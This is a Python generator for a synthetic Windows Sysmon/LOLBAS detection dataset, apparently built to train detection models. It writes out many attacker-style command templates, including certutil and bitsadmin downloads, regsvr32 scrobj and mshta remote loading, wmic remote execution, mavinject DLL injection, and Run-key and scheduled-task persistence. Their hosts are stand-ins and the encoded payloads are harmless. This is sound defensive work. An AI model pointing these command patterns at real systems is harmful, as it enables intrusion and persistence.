#!/usr/bin/env python3
"""
Generate a safe, LOLBAS-grounded Windows Sysmon Event logs dataset for detection engineering.

Author:  Daniel Jeremiah
GitHub:  https://github.com/daniyyell-dev
LinkedIn: https://www.linkedin.com/in/daniel-jeremiah/
Project: WinLOLBIN-GT — https://github.com/daniyyell-dev/WinLOLBIN-GT-dataset

Both classes are driven by the full official LOLBAS dataset (every binary, script,
and library entry that has Commands) from https://lolbas-project.github.io/api/lolbas.json
(cached at Machine Learning/data/lolbas_api/lolbas.json when present).

Malicious-style rows are drawn primarily from libLOL (cmd_huge_known_commented.csv):
realistic command prompts plus attack_rationale / attack_outcome text describing how the
chain would present on an endpoint. LOLBAS API rows supplement when libLOL is exhausted.
Remote URLs resolve only to documentation / lab space (RFC 5737, example.invalid) — not live C2.

Benign rows mix LOLBAS-aware /help-style usage with generic desktop and admin activity
(adjust GENERIC_BENIGN_FRACTION from real windows endpoints). Benign rows include attack_rationale / attack_outcome text
explaining expected operator or end-user behavior (same columns as malicious for ML parity).
Parent image and parent command line are correlated with the child.

Outputs (written to ../datasets; names reflect --rows-per-class):
  1. winlolbin_gt_unprocessed_malicious_<N>.csv
  2. winlolbin_gt_unprocessed_benign_<N>.csv
  3. winlolbin_gt_unprocessed_merged_<2N>.csv  (shuffled malicious + benign)

Every row is unique by dedup_key (label + process + normalized command line). When
catalog sampling collides, parametric command variants are emitted instead.
"""

from __future__ import annotations

import argparse
import csv
import json
import random
import time
import base64
import re
import urllib.request
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from winlolbin_parametric import (
    UniqueCommandRegistry,
    benign_command_at_index,
    malicious_command_at_index,
    uniquify_liblol_prompt,
)

LOLBAS_JSON_URL = "https://lolbas-project.github.io/api/lolbas.json"
OUTPUT_DIR = Path(__file__).resolve().parent.parent / "datasets"
ML_DATA_DIR = Path(__file__).resolve().parents[3] / "Machine Learning" / "data"
DEFAULT_ROWS_PER_CLASS = 5_000_000
WRITE_BATCH_SIZE = 50_000
SEED = 20260515
random.seed(SEED)

# Share of benign rows that mimic ordinary desktop / admin activity (not from LOLBAS catalog).
# Improves separation from attack class and aligns better with real endpoint mix + JSONL-style benign.
GENERIC_BENIGN_FRACTION = 0.36
# Malicious rows: fraction sourced from libLOL CSV (remainder from LOLBAS API / templates).
LIBLOL_MALICIOUS_FRACTION = 0.88
LIBLOL_CSV = ML_DATA_DIR / "liblol" / "cmd_huge_known_commented.csv"

HOSTS = [
    "WS-ENG-001", "WS-FIN-002", "WS-HR-003", "WS-OPS-004", "WS-SEC-005",
    "LAP-UK-101", "LAP-UK-102", "LAP-UK-103", "SRV-APP-01", "SRV-FILE-01",
]
USERS = [
    "CONTOSO\\ajones", "CONTOSO\\bsmith", "CONTOSO\\cpatel", "CONTOSO\\dnguyen",
    "CONTOSO\\emiller", "CONTOSO\\svc_deploy", "CONTOSO\\svc_backup", "CONTOSO\\analyst01",
]
PARENTS = [
    "explorer.exe", "cmd.exe", "powershell.exe", "wscript.exe", "services.exe", "svchost.exe",
    "winword.exe", "excel.exe", "outlook.exe", "taskeng.exe", "wmiprvse.exe", "msiexec.exe",
]
LOLBIN_SEVERITIES = ["medium", "high", "critical"]
BENIGN_SEVERITIES = ["informational", "low"]

LOLBIN_TECHNIQUES = {
    "powershell.exe": "T1059.001",
    "pwsh.exe": "T1059.001",
    "cmd.exe": "T1059.003",
    "wscript.exe": "T1059.005",
    "cscript.exe": "T1059.005",
    "mshta.exe": "T1218.005",
    "rundll32.exe": "T1218.011",
    "regsvr32.exe": "T1218.010",
    "certutil.exe": "T1105",
    "bitsadmin.exe": "T1197",
    "msbuild.exe": "T1127.001",
    "installutil.exe": "T1218.004",
    "reg.exe": "T1112",
    "schtasks.exe": "T1053.005",
    "wmic.exe": "T1047",
    "forfiles.exe": "T1202",
    "control.exe": "T1218",
    "odbcconf.exe": "T1218.008",
    "cmstp.exe": "T1218.003",
    "mavinject.exe": "T1218.013",
    "presentationhost.exe": "T1218.014",
    "msiexec.exe": "T1218.007",
    "hh.exe": "T1218.001",
    "pcalua.exe": "T1218",
    "msxsl.exe": "T1220",
}

SYSTEM32 = r"C:\Windows\System32"
SYSWOW64 = r"C:\Windows\SysWOW64"
PROGRAM_DATA = r"C:\ProgramData"
PUBLIC = r"C:\Users\Public"
TEMP = r"C:\Users\{user}\AppData\Local\Temp"

_RE_LOLBAS_REMOTE = re.compile(r"\{REMOTEURL[^}]*\}")
_RE_LOLBAS_PATH = re.compile(r"\{PATH[^}]*\}")
_RE_LOLBAS_PATH_ABS = re.compile(r"\{PATH_ABSOLUTE[^}]*\}")
_RE_LOLBAS_CMD = re.compile(r"\{CMD[^}]*\}")
_RE_LOLBAS_ANY_BRACE = re.compile(r"\{[^}]+\}")

_lolbas_entries_cache: List[Dict[str, Any]] | None = None
_liblol_entries_cache: List[Dict[str, str]] | None = None

_RE_LIBLOL_HTTP = re.compile(r"https?://[^\s'\"]+", re.IGNORECASE)
_RE_LIBLOL_PRIVATE_IP = re.compile(
    r"\b(?:10|11|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b"
)
_RE_LIBLOL_MALWARE_TOKEN = re.compile(
    r"\b(?:evil\.dll|evil\.exe|malware|payload\.exe|stage\.exe|unsigned\.dll)\b",
    re.IGNORECASE,
)


def rand_hex(n: int = 8) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(n))


def rand_user_short() -> str:
    return random.choice(["ajones", "bsmith", "cpatel", "dnguyen", "emiller", "analyst01"])


def random_timestamp(start: datetime, days: int = 90) -> str:
    delta = timedelta(seconds=random.randint(0, days * 24 * 60 * 60))
    return (start + delta).isoformat(timespec="seconds")


def safe_url(kind: str = "payload") -> str:
    """Reserved non-routed documentation host (fallback only)."""
    return f"http://example.invalid/{kind}/{rand_hex(10)}"


def apt_style_remote_url() -> str:
    """URL patterns common in threat reporting; hosts/IPs are non-infrastructure (RFC 5737 / lab)."""
    h = rand_hex(8)
    g = rand_hex(4)
    ip_doc = random.choice(
        [
            f"203.0.113.{random.randint(2, 250)}",
            f"198.51.100.{random.randint(2, 250)}",
            f"192.0.2.{random.randint(2, 200)}",
        ]
    )
    templates = [
        f"https://pastebin.com/raw/{h}",
        f"https://raw.githubusercontent.com/user-{g}/payloads/main/{h}.txt",
        f"https://bit.ly/{h[:7]}",
        f"http://{ip_doc}/cdn/{h}/loader.bin",
        f"https://cdn.contoso.lab/files/{h}.dat",
        f"https://transfer.contoso.lab/d/{h}/{g}.dll",
        f"ms-appinstaller:?source=https://raw.githubusercontent.com/org-{g}/pkg/main/{h}.appx",
    ]
    return random.choice(templates)


def stage_path_bin() -> str:
    """Staged paths that mimic operator temp layout (no real files)."""
    user = rand_user_short()
    sub = rand_hex(6)
    return random.choice(
        [
            f"{PUBLIC}\\{sub}.dll",
            f"{PUBLIC}\\{sub}\\update.exe",
            f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{sub}.tmp",
            f"{PROGRAM_DATA}\\{sub}\\cache.dll",
            f"{SYSTEM32}\\spool\\drivers\\color\\{sub}.dll",
        ]
    )


def choose_path(process_name: str) -> str:
    if "\\" in process_name:
        return process_name
    base = random.choice([SYSTEM32, SYSWOW64])
    return f"{base}\\{process_name}"


def _lolbas_path_usable(path: str) -> bool:
    """Reject LOLBAS API placeholder paths that break ML feature quality."""
    s = path.strip()
    if not s:
        return False
    low = s.lower()
    if low in ("no default", "n/a", "none", "unknown", "tbd"):
        return False
    if "no default" in low or "<version>" in low or "choose " in low:
        return False
    return "\\" in s or "/" in s or low.endswith((".exe", ".dll", ".vbs", ".ps1", ".bat"))


def _lolbas_cache_file() -> Path:
    return ML_DATA_DIR / "lolbas_api" / "lolbas.json"


def _liblol_row_usable(row: Dict[str, str]) -> bool:
    prompt = (row.get("prompt") or "").strip()
    response = (row.get("response") or "").strip()
    if len(prompt) < 6 or not response:
        return False
    rl = response.lower()
    skip_phrases = (
        "not a valid windows command",
        "not a standard windows command",
        "does not exist in a default windows",
        "not a standard windows",
    )
    return not any(p in rl for p in skip_phrases)


def get_liblol_entries() -> List[Dict[str, str]]:
    """libLOL prompt/response pairs (Machine Learning/data/liblol/cmd_huge_known_commented.csv)."""
    global _liblol_entries_cache
    if _liblol_entries_cache is not None:
        return _liblol_entries_cache
    if not LIBLOL_CSV.is_file():
        raise FileNotFoundError(f"libLOL CSV not found: {LIBLOL_CSV}")
    rows: List[Dict[str, str]] = []
    with LIBLOL_CSV.open(newline="", encoding="utf-8", errors="replace") as f:
        for row in csv.DictReader(f):
            if not isinstance(row, dict):
                continue
            cleaned = {
                "prompt": (row.get("prompt") or "").strip(),
                "response": (row.get("response") or "").strip(),
            }
            if _liblol_row_usable(cleaned):
                rows.append(cleaned)
    if not rows:
        raise RuntimeError(f"No usable rows in libLOL CSV: {LIBLOL_CSV}")
    _liblol_entries_cache = rows
    return _liblol_entries_cache


def instantiate_liblol_command(prompt: str) -> str:
    """Sanitize libLOL prompts: lab URLs/paths only, keep attack-relevant syntax."""
    s = prompt.strip()
    s = _RE_LIBLOL_HTTP.sub(lambda _: apt_style_remote_url(), s)
    s = _RE_LIBLOL_PRIVATE_IP.sub(
        lambda _: random.choice(
            ["203.0.113.42", "198.51.100.88", "192.0.2.55", "203.0.113.201"]
        ),
        s,
    )
    s = _RE_LIBLOL_MALWARE_TOKEN.sub(lambda _: stage_path_bin().split("\\")[-1], s)
    s = re.sub(r"webhook\.site/[^\s'\"]+", lambda _: f"example.invalid/hook/{rand_hex(8)}", s, flags=re.I)
    s = re.sub(r"example\.org\b", "example.invalid", s, flags=re.I)
    s = re.sub(r"evil\.example\b", "example.invalid", s, flags=re.I)
    s = re.sub(
        r"c:\\\\(?:pathToFile|path|data|ads|destinationFolder|users)[^,\s\"]*",
        lambda _: stage_path_bin().replace("\\", "\\\\"),
        s,
        flags=re.I,
    )
    s = re.sub(r"c:\\\\temp(?::|\\\\)", rf"c:\\\\Users\\\\Public\\\\{rand_hex(4)}:", s, flags=re.I)
    s = re.sub(r"c:\\\\temp\\\\", rf"c:\\\\Users\\\\Public\\\\{rand_hex(4)}\\\\", s, flags=re.I)
    while "\\\\\\\\" in s:
        s = s.replace("\\\\\\\\", "\\\\")
    return variabilize_invocation(s)


def normalize_attack_rationale(response: str) -> str:
    """Analyst-style narrative from libLOL (single line for CSV, length-capped)."""
    s = re.sub(r"\s+", " ", (response or "").strip())
    if len(s) > 1400:
        return s[:1397] + "..."
    return s


def summarize_attack_outcome(response: str) -> str:
    """Short operator timeline: how this would read in a real intrusion on the endpoint."""
    r = (response or "").lower()
    stages: List[str] = []
    if any(x in r for x in ("download", "remote server", "from a url", "from the internet", "pull")):
        stages.append("Pulls second-stage content from operator infrastructure")
    if any(x in r for x in ("execute", "arbitrary code", "run malicious", "payload", "invoke")):
        stages.append("Runs code under a trusted Microsoft-signed parent process")
    if any(x in r for x in ("persist", "run key", "scheduled", "logon", "reboot", "maintain")):
        stages.append("Establishes or reinforces persistence on the host")
    if any(x in r for x in ("credential", "cmdkey", "lsass", "dump", "secrets")):
        stages.append("Targets credentials or sensitive host data")
    if any(x in r for x in ("bypass", "evade", "whitelisting", "app locker", "defender")):
        stages.append("Aims to evade application control or monitoring")
    if any(x in r for x in ("exfiltrat", "upload", " post ", "send ", "webhook")):
        stages.append("Moves data to an external collection point")
    if any(x in r for x in ("encode", "decode", "obfuscat", "alternate data stream", " ads")):
        stages.append("Stages or hides payload bytes on disk")
    if not stages:
        stages.append("Abuses a legitimate Windows binary for an unintended execution path")
    return " → ".join(stages[:4])


def extract_process_name_from_command(command_line: str) -> str:
    s = command_line.strip()
    if s.lower().startswith("start ms-appinstaller"):
        return "AppInstaller.exe"
    m = re.search(r"([\w.-]+\.exe)\b", s, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"([\w.-]+\.(?:dll|vbs|bat|ps1|wsf|js|inf|cpl))\b", s, re.IGNORECASE)
    if m:
        return m.group(1)
    tok = re.split(r"[\s/]+", s, maxsplit=1)[0].strip('"').strip("'")
    if "\\" in tok:
        tok = tok.rsplit("\\", 1)[-1]
    if tok and "." not in tok:
        return f"{tok}.exe"
    return tok if tok else "unknown.exe"


def find_lolbas_entry_for_name(name: str, entries: List[Dict[str, Any]]) -> Dict[str, Any] | None:
    target = name.lower()
    base = target.replace(".exe", "").replace(".dll", "")
    for entry in entries:
        en = str(entry.get("Name", "")).lower()
        if en == target:
            return entry
        if en.replace(".exe", "").replace(".dll", "") == base:
            return entry
    return None


def suspicious_enrichment_liblol(
    process_name: str, command_line: str, response: str, mitre_hint: str = ""
) -> Dict[str, str]:
    out = suspicious_enrichment(process_name, mitre_hint)
    if re.search(r"https?://", command_line, re.IGNORECASE):
        out["network_connection"] = "true"
        if not out["destination"].strip():
            out["destination"] = apt_style_remote_url()
    rl = response.lower()
    if any(x in rl for x in ("persist", "run key", "scheduled", "logon", "startup")):
        out["rule_category"] = "lolbin_persistence"
    elif any(x in rl for x in ("download", "remote", "url", "pull", "fetch")):
        out["rule_category"] = "lolbin_remote_content"
    elif any(x in rl for x in ("encode", "hidden", "bypass", "evade", "obfuscat")):
        out["rule_category"] = "lolbin_encoded_or_hidden_execution"
    elif any(x in rl for x in ("proxy", "execute", "arbitrary", "child")):
        out["rule_category"] = "lolbin_proxy_execution"
    if any(x in rl for x in ("credential", "dump", "lsass", "secrets")):
        out["severity"] = random.choice(["high", "critical"])
    return out


def lolbas_attack_narrative(mitre: str, rule_category: str) -> tuple[str, str]:
    mitre_s = mitre or "T1218"
    cat = rule_category.replace("lolbin_", "").replace("_", " ")
    rationale = (
        f"LOLBAS-documented abuse pattern ({mitre_s}): operator chains a signed Windows "
        f"utility for {cat} instead of its intended administrative role."
    )
    outcome = (
        f"Documented LOLBin technique {mitre_s} → typical SOC story: unusual {cat} "
        f"from a trusted binary with suspicious child or network indicators."
    )
    return rationale, outcome


def get_lolbas_entries() -> List[Dict[str, Any]]:
    """Full LOLBAS API entries that include at least one Command (entire project coverage)."""
    global _lolbas_entries_cache
    if _lolbas_entries_cache is not None:
        return _lolbas_entries_cache
    cache = _lolbas_cache_file()
    if cache.is_file():
        raw = cache.read_text(encoding="utf-8", errors="replace")
    else:
        req = urllib.request.Request(
            LOLBAS_JSON_URL,
            headers={"User-Agent": "lolbin-benign-dataset/1.0"},
        )
        with urllib.request.urlopen(req, timeout=120) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    data = json.loads(raw)
    out: List[Dict[str, Any]] = []
    for entry in data:
        if not isinstance(entry, dict):
            continue
        cmds = entry.get("Commands")
        if isinstance(cmds, list) and cmds:
            out.append(entry)
    if not out:
        raise RuntimeError("LOLBAS API returned no usable entries")
    _lolbas_entries_cache = out
    return _lolbas_entries_cache


def entry_image_paths(entry: Dict[str, Any]) -> List[str]:
    paths: List[str] = []
    fp = entry.get("Full_Path")
    if isinstance(fp, list):
        for p in fp:
            if isinstance(p, dict):
                s = p.get("Path")
                if isinstance(s, str) and _lolbas_path_usable(s):
                    paths.append(s.strip())
    name = entry.get("Name")
    if isinstance(name, str) and name and not paths:
        paths.append(choose_path(name))
    return paths


def pick_process_image_path(process_name: str, entry: Dict[str, Any] | None) -> str:
    if entry:
        ps = entry_image_paths(entry)
        if ps:
            return random.choice(ps)
    return choose_path(process_name)


def template_key_for_entry_name(name: str) -> str | None:
    key = name.lower()
    return key if key in LOLBIN_TECHNIQUES else None


# Heuristic enrichments for synthetic SIEM-style rows (orthogonal to LOLBAS API MitreID).
_LOLBIN_NETWORK_PROCESSES = frozenset(
    {
        "powershell.exe",
        "pwsh.exe",
        "mshta.exe",
        "regsvr32.exe",
        "certutil.exe",
        "bitsadmin.exe",
        "presentationhost.exe",
        "msiexec.exe",
        "hh.exe",
        "msxsl.exe",
        "rundll32.exe",
    }
)
_LOLBIN_WRITES_FILE_PROCESSES = frozenset(
    {
        "powershell.exe",
        "pwsh.exe",
        "cmd.exe",
        "certutil.exe",
        "bitsadmin.exe",
        "msiexec.exe",
        "msbuild.exe",
        "installutil.exe",
        "mshta.exe",
        "hh.exe",
    }
)
_LOLBIN_REGISTRY_CONTEXT_PROCESSES = frozenset(
    {
        "reg.exe",
        "schtasks.exe",
        "wmic.exe",
        "powershell.exe",
        "cmd.exe",
    }
)
# When API MitreID implies remote transfer / C2-shaped behaviour, also flag network.
_MITRE_NETWORK_PREFIXES = (
    "T1105",
    "T1567",
    "T1071",
    "T1048",
    "T1090",
    "T1219",
    "T1102",
)


def suspicious_enrichment(process_name: str, mitre_hint: str = "") -> Dict[str, str]:
    """Blend classic process-based heuristics with optional LOLBAS API MitreID."""
    pn = process_name.lower()
    mitre_from_api = (mitre_hint or "").strip()
    mitre = mitre_from_api or LOLBIN_TECHNIQUES.get(pn, "T1218")

    uses_network = pn in _LOLBIN_NETWORK_PROCESSES
    if not uses_network and mitre_from_api:
        uses_network = any(mitre_from_api.startswith(p) for p in _MITRE_NETWORK_PREFIXES)

    writes_file = pn in _LOLBIN_WRITES_FILE_PROCESSES
    if writes_file and random.random() < 0.35:
        file_write = random.choice(
            [
                rf"{PUBLIC}\{rand_hex(6)}.tmp",
                rf"C:\Users\{rand_user_short()}\AppData\Local\Temp\{rand_hex(6)}.log",
                rf"{PROGRAM_DATA}\Microsoft\{rand_hex(4)}\state.bin",
            ]
        )
    elif writes_file:
        file_write = rf"{PUBLIC}\{rand_hex(6)}.tmp"
    else:
        file_write = ""

    registry = ""
    if pn in _LOLBIN_REGISTRY_CONTEXT_PROCESSES:
        registry = random.choice(
            [
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
            ]
        )

    network_str = "true" if uses_network else "false"
    destination = ""
    if uses_network:
        destination = random.choice(
            [apt_style_remote_url(), apt_style_remote_url(), safe_url("telemetry"), safe_url("beacon")]
        )

    return {
        "network_connection": network_str,
        "destination": destination,
        "file_write_path": file_write,
        "registry_key": registry,
        "rule_category": random.choice(
            [
                "lolbin_remote_content",
                "lolbin_proxy_execution",
                "lolbin_persistence",
                "lolbin_encoded_or_hidden_execution",
                "lolbin_unusual_parent_child",
            ]
        ),
        "mitre_technique": mitre,
        "severity": random.choice(LOLBIN_SEVERITIES),
    }


def variabilize_invocation(command_line: str) -> str:
    """Light realism: full paths, casing, occasional cmd prefix — without changing semantics."""
    s = command_line.strip()
    if not s:
        return s
    if s.lower().startswith("powershell.exe ") and random.random() < 0.22:
        s = (
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "
            + s[len("powershell.exe") :].lstrip()
        )
    elif s.lower().startswith("cmd.exe ") and random.random() < 0.12:
        s = r'C:\Windows\System32\cmd.exe' + s[len("cmd.exe") :]
    if random.random() < 0.04 and not s.lower().startswith("cmd.exe /c "):
        if '"' not in s and random.random() < 0.5:
            s = rf'cmd.exe /c "{s}"'
    return s


def _inner_cmd_placeholder() -> str:
    inner = random.choice(
        [
            rf'{SYSTEM32}\cmd.exe /c "{SYSTEM32}\whoami.exe"',
            rf'{SYSTEM32}\cmd.exe /c "{SYSTEM32}\hostname.exe"',
            rf'{SYSTEM32}\cmd.exe /c "{SYSTEM32}\systeminfo.exe" | findstr /B /C:"OS Name"',
            rf'"{SYSTEM32}\cmd.exe" /c dir /b "{PUBLIC}"',
        ]
    )
    return inner


def instantiate_lolbas_command(raw: str) -> str:
    """LOLBA placeholders -> realistic-looking but non-operational literals."""
    s = raw.strip()
    s = _RE_LOLBAS_REMOTE.sub(lambda _: apt_style_remote_url(), s)
    s = _RE_LOLBAS_PATH.sub(lambda _: stage_path_bin(), s)
    s = _RE_LOLBAS_PATH_ABS.sub(lambda _: f"{PUBLIC}\\pay_{rand_hex(6)}.exe", s)
    s = _RE_LOLBAS_CMD.sub(lambda _: _inner_cmd_placeholder(), s)
    s = _RE_LOLBAS_ANY_BRACE.sub("X", s)
    return variabilize_invocation(s)


_B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="


def powershell_encoded_command_benign() -> str:
    """Exactly what PowerShell -EncodedCommand expects: UTF-16LE then base64. Decodes to a harmless one-liner."""
    snippet = random.choice(
        [
            "Write-Output 'synthetic-lab'",
            "[Environment]::MachineName",
            "$PSVersionTable.PSVersion.ToString()",
            "Get-Date -Format 'o'",
            "(Get-CimInstance Win32_OperatingSystem).Caption",
        ]
    )
    return base64.b64encode(snippet.encode("utf-16-le")).decode("ascii")


def synthetic_encoded_command(min_len: int = 200, max_len: int = 420) -> str:
    """Mix: some rows use real encodable PS (short); most use a long blob shaped like commodity -EncodedCommand.

    Long blobs are not valid base64 decodes to UTF-16LE PS — intentional so the dataset is safe to paste/run.
    """
    if random.random() < 0.28:
        return powershell_encoded_command_benign()
    n = random.randint(min_len, max(max_len, min_len))
    return "".join(random.choice(_B64_CHARS) for _ in range(n))


def synthetic_nop_short_trailer(name: str) -> str:
    """Safe for embedding in schtasks /TR and reg /d double-quoted values (no nested ")."""
    if random.random() < 0.5:
        enc = powershell_encoded_command_benign()
    else:
        enc = synthetic_encoded_command(200, 380)
    return random.choice(
        [
            f"-enc {enc}",
            f"-nop -w hidden -enc {powershell_encoded_command_benign() if random.random() < 0.5 else synthetic_encoded_command(160, 300)}",
            f"-nop -w 1 -ep bypass -f {PUBLIC}\\init_{name}.ps1",
        ]
    )


def synthetic_remote_hostname() -> str:
    return random.choice(
        [
            "FILE-SRV-02.contoso.lab",
            "DC01.daniyell.lab",
            "SHARE-APP01.contoso.lab",
            "WS-ENG-14.contoso.lab",
            "LAP-FIN-09.contoso.lab",
        ]
    )


def synthetic_process_pid() -> str:
    return str(random.randint(2048, 32768))


def synthetic_msbuild_target() -> str:
    return random.choice(["Build", "Rebuild", "Clean", "Deploy", "Package", "Publish"])


def suspicious_command(process_name: str) -> str:
    user = rand_user_short()
    tmp = TEMP.format(user=user)
    name = rand_hex(6)
    enc = synthetic_encoded_command()
    enc_mid = synthetic_encoded_command(140, 260)
    rhost = synthetic_remote_hostname()
    pid = synthetic_process_pid()
    msb_tgt = synthetic_msbuild_target()
    nop_tr = synthetic_nop_short_trailer(name)
    run_child = random.choice(
        [
            rf'cmd.exe /c "{SYSTEM32}\mshta.exe {apt_style_remote_url()}"',
            rf'"{PUBLIC}\worker_{name}.exe"',
            rf'rundll32.exe {SYSTEM32}\shell32.dll,ShellExec_RunDLL "{PUBLIC}\setup_{name}.exe"',
        ]
    )
    for_cmd = random.choice(
        [
            rf'dir /b /a "{SYSTEM32}\*.evtx"',
            rf'where /r "{PUBLIC}" "*.tmp"',
            rf'tree /f "{tmp}"',
        ]
    )
    wmic_remote = random.choice(
        [
            f"powershell.exe -NoProfile -EncodedCommand {enc_mid}",
            rf'cmd.exe /c "{SYSTEM32}\bitsadmin.exe /transfer z /download /priority high {apt_style_remote_url()} {PUBLIC}\job_{name}.dat"',
            rf'rundll32.exe "{tmp}\{name}.dll",DllGetClassObject',
        ]
    )
    templates: Dict[str, List[str]] = {
        "powershell.exe": [
            rf'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{PROGRAM_DATA}\\{name}.ps1"',
            rf'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {enc}',
            rf'powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri {apt_style_remote_url()} -OutFile {PUBLIC}\\{name}.ps1"',
            rf'powershell.exe -NoProfile -Command "Start-Process rundll32.exe -ArgumentList shell32.dll,ShellExec_RunDLL,{PUBLIC}\\{name}.exe"',
        ],
        "pwsh.exe": [
            rf'pwsh.exe -NoProfile -ExecutionPolicy Bypass -File "{tmp}\\{name}.ps1"',
            rf'pwsh.exe -NoProfile -EncodedCommand {enc}',
        ],
        "cmd.exe": [
            rf'cmd.exe /c "copy {tmp}\\{name}.tmp {PUBLIC}\\{name}.exe && {PUBLIC}\\{name}.exe"',
            rf'cmd.exe /c "for /f %i in (''{for_cmd}'') do @cmd /c {run_child}"',
            rf'cmd.exe /c "powershell.exe -NoP -EncodedCommand {enc}"',
        ],
        "wscript.exe": [
            rf'wscript.exe "{tmp}\\{name}.vbs" //B',
            rf'wscript.exe "{PUBLIC}\\{name}.js" //E:jscript',
        ],
        "cscript.exe": [
            rf'cscript.exe //nologo "{tmp}\\{name}.vbs"',
            rf'cscript.exe //E:jscript "{PUBLIC}\\{name}.js"',
        ],
        "mshta.exe": [
            rf'mshta.exe "{apt_style_remote_url()}"',
            rf'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c powershell.exe -NoP -enc {enc_mid}"",0:close")',
        ],
        "rundll32.exe": [
            rf'rundll32.exe {tmp}\\{name}.dll,StartW',
            rf'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write("<script src={apt_style_remote_url()}></script>")',
            rf'rundll32.exe shell32.dll,ShellExec_RunDLL "{PUBLIC}\\{name}.exe"',
        ],
        "regsvr32.exe": [
            rf'regsvr32.exe /s /n /u /i:{apt_style_remote_url()} scrobj.dll',
            rf'regsvr32.exe /s "{tmp}\\{name}.dll"',
        ],
        "certutil.exe": [
            rf'certutil.exe -urlcache -split -f {apt_style_remote_url()} {PUBLIC}\\{name}.bin',
            rf'certutil.exe -decode "{tmp}\\{name}.b64" "{PUBLIC}\\{name}.exe"',
            rf'certutil.exe -encode "{PUBLIC}\\{name}.exe" "{tmp}\\{name}.txt"',
        ],
        "bitsadmin.exe": [
            rf'bitsadmin.exe /transfer job_{name} /download /priority foreground {apt_style_remote_url()} {PUBLIC}\\{name}.bin',
            rf'bitsadmin.exe /create job_{name} & bitsadmin.exe /addfile job_{name} {apt_style_remote_url()} {tmp}\\{name}.dll',
        ],
        "msbuild.exe": [
            rf'msbuild.exe "{tmp}\\{name}.csproj" /p:Configuration=Release',
            rf'msbuild.exe "{PUBLIC}\\{name}.xml" /target:{msb_tgt}',
        ],
        "installutil.exe": [
            rf'installutil.exe /logfile= /LogToConsole=false "{tmp}\\{name}.exe"',
            rf'installutil.exe /U "{PUBLIC}\\{name}.dll"',
        ],
        "reg.exe": [
            rf'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d "{PUBLIC}\\{name}.exe" /f',
            rf'reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v {name} /d "powershell.exe -NoP {nop_tr}" /f',
        ],
        "schtasks.exe": [
            rf'schtasks.exe /Create /SC MINUTE /MO 30 /TN "Update_{name}" /TR "{PUBLIC}\\{name}.exe" /F',
            rf'schtasks.exe /Create /SC ONLOGON /TN "System_{name}" /TR "powershell.exe -NoP {nop_tr}" /F',
        ],
        "wmic.exe": [
            rf'wmic.exe process call create "powershell.exe -NoProfile -EncodedCommand {enc}"',
            rf'wmic.exe /node:{rhost} process call create "{wmic_remote}"',
        ],
        "forfiles.exe": [
            rf'forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c "cmd /c {PUBLIC}\\{name}.exe"',
            rf'forfiles.exe /p {PUBLIC} /m *.txt /c "cmd /c powershell.exe -NoP -enc {enc_mid}"',
        ],
        "control.exe": [
            rf'control.exe "{tmp}\\{name}.cpl"',
            rf'control.exe appwiz.cpl,{PUBLIC}\\{name}.dll',
        ],
        "odbcconf.exe": [
            rf'odbcconf.exe /a {{regsvr {tmp}\\{name}.dll}}',
            rf'odbcconf.exe /s /a {{regsvr {PUBLIC}\\{name}.dll}}',
        ],
        "cmstp.exe": [
            rf'cmstp.exe /s "{tmp}\\{name}.inf"',
            rf'cmstp.exe /au "{PUBLIC}\\{name}.inf"',
        ],
        "mavinject.exe": [
            rf'mavinject.exe {pid} /INJECTRUNNING "{tmp}\\{name}.dll"',
            rf'mavinject.exe {pid} /INJECTRUNNING "{PUBLIC}\\{name}.dll"',
        ],
        "presentationhost.exe": [
            rf'presentationhost.exe "{apt_style_remote_url()}"',
            rf'presentationhost.exe "{tmp}\\{name}.xbap"',
        ],
        "msiexec.exe": [
            rf'msiexec.exe /q /i {apt_style_remote_url()}',
            rf'msiexec.exe /quiet /i "{PUBLIC}\\{name}.msi"',
        ],
        "hh.exe": [
            rf'hh.exe "{apt_style_remote_url()}"',
            rf'hh.exe "{tmp}\\{name}.chm"',
        ],
        "pcalua.exe": [
            rf'pcalua.exe -a "{PUBLIC}\\{name}.exe"',
            rf'pcalua.exe -a "cmd.exe" -p "/c powershell.exe -NoP -enc {enc_mid}"',
        ],
        "msxsl.exe": [
            rf'msxsl.exe "{tmp}\\{name}.xml" "{tmp}\\{name}.xsl"',
            rf'msxsl.exe "{apt_style_remote_url()}" "{apt_style_remote_url()}"',
        ],
    }
    return variabilize_invocation(random.choice(templates[process_name]))


def benign_command(process_name: str) -> str:
    user = rand_user_short()
    tmp = TEMP.format(user=user)
    name = rand_hex(6)
    templates: Dict[str, List[str]] = {
        "explorer.exe": [
            r'explorer.exe C:\Users',
            r'explorer.exe shell:Downloads',
            r'explorer.exe shell:AppsFolder',
        ],
        "chrome.exe": [
            r'chrome.exe --profile-directory="Default"',
            r'chrome.exe --type=renderer --lang=en-GB',
            r'chrome.exe --type=utility --utility-sub-type=network.mojom.NetworkService',
        ],
        "msedge.exe": [
            r'msedge.exe --profile-directory="Default"',
            r'msedge.exe --type=renderer --lang=en-GB',
        ],
        "winword.exe": [
            rf'winword.exe "C:\\Users\\{user}\\Documents\\Report_{name}.docx"',
            rf'winword.exe /q "C:\\Users\\{user}\\Documents\\MeetingNotes_{name}.docx"',
        ],
        "excel.exe": [
            rf'excel.exe "C:\\Users\\{user}\\Documents\\Budget_{name}.xlsx"',
